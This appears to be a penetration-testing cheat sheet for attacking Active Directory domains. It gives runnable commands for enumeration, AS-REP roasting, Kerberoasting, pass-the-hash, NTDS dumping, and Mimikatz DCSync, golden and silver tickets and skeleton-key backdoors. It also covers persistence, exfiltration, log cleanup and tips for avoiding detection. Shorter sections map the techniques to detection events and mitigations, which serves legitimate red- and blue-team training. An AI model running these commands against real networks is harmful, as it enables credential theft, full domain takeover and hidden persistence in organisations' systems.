---
icon: biohazard
---

# Active Directory / Enterprise Attack Flow

## **Active Directory / Enterprise Attack Flow — Red to Purple**

> 🧠 use only in **authorized labs or simulations**. this guide merges attacker methodology (MITRE TTPs) with blue-team visibility and detection cues.

***

### I. 🏗️ Active Directory Overview

| Element                    | Description                                              |
| -------------------------- | -------------------------------------------------------- |
| **DC (Domain Controller)** | Central authentication server (Kerberos/LDAP/SMB/WinRM). |
| **Domain**                 | Security boundary (e.g., `corp.local`).                  |
| **Forest**                 | Collection of domains with trusts.                       |
| **Objects**                | Users, Computers, Groups, GPOs, SPNs, etc.               |
| **Trusts**                 | Relationships allowing cross-domain authentication.      |
| **Tickets**                | Kerberos TGTs/TGSs — target of many AD attacks.          |

**Goal:** control DC → golden ticket → domain persistence.

***

### II. 🔎 Enumeration Phase (Information Discovery)

#### 🔹 From Linux (Remote)

```bash
nmap -p 88,135,139,389,445,464,593,636,3268,3269,5985,9389 $IP
ldapsearch -x -H ldap://$IP -b "DC=corp,DC=local"
crackmapexec smb $IP
crackmapexec winrm $IP
kerbrute userenum -d corp.local --dc $IP users.txt
GetNPUsers.py corp.local/ -dc-ip $IP -no-pass -usersfile users.txt
```

#### 🔹 From Windows (Domain Joined)

```powershell
Get-ADUser -Filter * -Properties servicePrincipalName
Get-ADGroupMember "Domain Admins"
Get-NetComputer -FullData
Get-NetSession -ComputerName <target>
```

#### 🔹 With BloodHound (Graph-based AD Mapping)

```powershell
SharpHound.exe --CollectionMethods All
```

Analyze with Neo4j: visualize users → groups → admin paths.

🧠 **Focus on:**

* Users with SPNs (for Kerberoasting)
* Machines with admin rights
* Delegation (unconstrained/constrained)
* Trust relationships (external/domain)

***

### III. 💣 Credential Attacks

#### 🧩 1. **AS-REP Roasting (No Pre-Auth)**

```bash
GetNPUsers.py corp.local/ -dc-ip $IP -no-pass -usersfile users.txt
hashcat -m 18200 hash.txt wordlist.txt
```

> Users with `DONT_REQ_PREAUTH` → offline password cracking.

***

#### 🧩 2. **Kerberoasting**

```bash
GetUserSPNs.py corp.local/user:pass -dc-ip $IP -request
hashcat -m 13100 kerb_hashes.txt wordlist.txt
```

> Extract TGS for service accounts → offline crack → reuse password.

***

#### 🧩 3. **Pass-the-Hash / Pass-the-Ticket**

```bash
psexec.py corp.local/user@dc.corp.local -hashes :NTLMHASH
```

or

```bash
export KRB5CCNAME=ticket.ccache
psexec.py -k -no-pass corp.local/user@target
```

***

#### 🧩 4. **Credential Dumping**

* **Windows:** `lsass.exe` → Mimikatz, Procdump
* **Linux (Samba):** `/var/lib/samba/private/secrets.tdb`
*   **Offline:** NTDS.dit + SYSTEM hive

    ```bash
    secretsdump.py -ntds ntds.dit -system SYSTEM -hashes LM:NTLM LOCAL
    ```

***

### IV. ⚙️ Lateral Movement

| Technique                    | Example                              | Detection                      |
| ---------------------------- | ------------------------------------ | ------------------------------ |
| **SMB Exec (PsExec)**        | `psexec.py user@host`                | Event ID 7045 (service create) |
| **WMI Exec**                 | `wmiexec.py user@host`               | Event ID 4688 (process create) |
| **WinRM**                    | `evil-winrm -i host -u user -p pass` | Event ID 4624 type 3           |
| **RDP**                      | GUI or `xfreerdp`                    | LogonType=10                   |
| **Scheduled Task / Service** | `schtasks /create`                   | Sysmon Event ID 1, 7045        |
| **DCOM Exec**                | lateral via explorer or MMC          | 4688, 4689, network noise      |

🧠 **Pro Tip:** always re-use discovered creds carefully and pivot through limited accounts to minimize detection.

***

### V. 🚀 Privilege Escalation (AD Context)

#### 🔹 Local to Domain

* Local admin on DC → dump secrets → DCSync.
* GPP password recovery (`Groups.xml` with cpassword).
* LAPS abuse if readable attributes.
* Dump local SAM → lateral brute.

#### 🔹 AD Misconfig Exploits

| Attack                                           | Description                                     |
| ------------------------------------------------ | ----------------------------------------------- |
| **DCSync (T1003.006)**                           | request secrets like DC                         |
| **Unconstrained Delegation**                     | extract TGT from memory on service host         |
| **Constrained Delegation**                       | impersonate service to another host             |
| **RBCD (Resource-Based Constrained Delegation)** | create fake machine account → delegate yourself |
| **ASREPRoast**                                   | no-preauth users                                |
| **Kerberoast**                                   | service tickets                                 |
| **Shadow Credentials / KeyCredentialLink**       | add alternate key to victim user                |
| **Cert Abuse (ESC1–ESC8)**                       | misconfigured ADCS templates                    |
| **DCShadow**                                     | replicate fake changes into AD                  |

***

### VI. 🧱 Domain Controller Domination

#### 🔹 DCSync

```powershell
mimikatz "lsadump::dcsync /domain:corp.local /user:krbtgt"
```

#### 🔹 Golden Ticket (KRBTGT)

```powershell
mimikatz "kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-XXXXX /krbtgt:HASH /id:500"
```

#### 🔹 Silver Ticket (Service)

```powershell
mimikatz "kerberos::golden /domain:corp.local /sid:S-1-5-21-XXXXX /target:HOST /service:cifs /rc4:HASH /user:Administrator"
```

#### 🔹 Skeleton Key (Permanent backdoor)

```powershell
mimikatz "misc::skeleton"
```

***

### VII. 🧩 Persistence Techniques (Domain)

| Method                               | Command / Concept           |
| ------------------------------------ | --------------------------- |
| **Golden/Silver Ticket**             | Long-term Kerberos control. |
| **AdminSDHolder abuse**              | Permanent group membership. |
| **SID History Injection**            | Impersonate another SID.    |
| **GPO Scheduled Task / Script**      | Auto-execution.             |
| **WMI permanent event subscription** | Hidden persistence.         |
| **DCShadow**                         | Replicate fake entries.     |

***

### VIII. 🛰️ Exfiltration & Impact (for lab use)

*   Enumerate shares:

    ```bash
    net view \\<host>
    dir \\<host>\C$
    ```
* Copy sensitive files (proof, backups, scripts).
* Exfil via SMB/HTTP (within legal sandbox).
* Cleanup artifacts after evidence collection.

***

### IX. 🧠 Detection & Blue-Team Mapping

| Behavior               | Log Source             | Event IDs / Clues                    |
| ---------------------- | ---------------------- | ------------------------------------ |
| AS-REP / Kerberoast    | DC Security Log        | 4768, 4769 anomalies                 |
| Pass-the-Hash / Ticket | Security Log           | Logon Type 3/9 with reused IPs       |
| DCSync                 | DC                     | 4662 with DS-Replication-Get-Changes |
| PrivEsc                | System                 | 7045, 4697, 4688                     |
| BloodHound Collection  | Network IDS            | LDAP enumeration bursts              |
| PowerShell Abuse       | Windows PowerShell Log | 4104 encoded commands                |
| Golden Ticket          | DC Log                 | long-duration TGT anomalies          |

***

### X. 🧰 Toolkit Quick Reference

| Tool                        | Use                                                |
| --------------------------- | -------------------------------------------------- |
| **Impacket suite**          | All protocol exploits (SMB, WMI, WinRM, Kerberos). |
| **BloodHound / SharpHound** | AD relationship mapping.                           |
| **CrackMapExec**            | Lateral movement + credential spray.               |
| **Rubeus**                  | Ticket management / Kerberos abuse.                |
| **Certipy**                 | ADCS enumeration + exploitation.                   |
| **Mimikatz**                | Credential dump, ticket creation, DCSync.          |
| **Responder / ntlmrelayx**  | LLMNR/NBNS poisoning, relay attacks.               |
| **PowerView / ADModule**    | In-domain enumeration.                             |
| **evil-winrm / psexec.py**  | Remote shells.                                     |

***

### XI. 🧠 Offensive-Defensive Flow (AD Chain Example)

```
1️⃣  Recon: nmap, ldapsearch, BloodHound
2️⃣  Cred discovery: AS-REP / Kerberoast / dump
3️⃣  Lateral move: WinRM → new host
4️⃣  PrivEsc: SeImpersonate → SYSTEM
5️⃣  Domain exploit: DCSync / Golden Ticket
6️⃣  Persistence: DCShadow / SIDHistory
7️⃣  Cleanup: remove temp users / logs
```

💥 **Difficulty scaling (HTB style):**

* **Easy:** AS-REP → crack → WinRM → DCSync.
* **Medium:** Web shell → creds → Kerberoast → WinRM.
* **Hard:** RBCD chain / constrained delegation.
* **Insane:** ADCS abuse (ESC1/ESC8) + multi-domain pivot.

***

### XII. 🔒 Defense Highlights (Purple Notes)

| Technique     | Detection                                           | Mitigation                          |
| ------------- | --------------------------------------------------- | ----------------------------------- |
| Kerberoast    | Audit 4769 for RC4 tickets                          | Use AES, disable weak crypto        |
| AS-REP        | Audit accounts w/o pre-auth                         | Enforce pre-auth                    |
| RBCD          | Restrict `msDS-AllowedToActOnBehalfOfOtherIdentity` | Tighten ACLs                        |
| DCSync        | Detect 4662 replication reads                       | Limit replication rights            |
| Golden Ticket | TGT lifetime anomalies                              | Rotate KRBTGT keys periodically     |
| DCShadow      | Unusual replication partners                        | Disable unneeded replication rights |

***
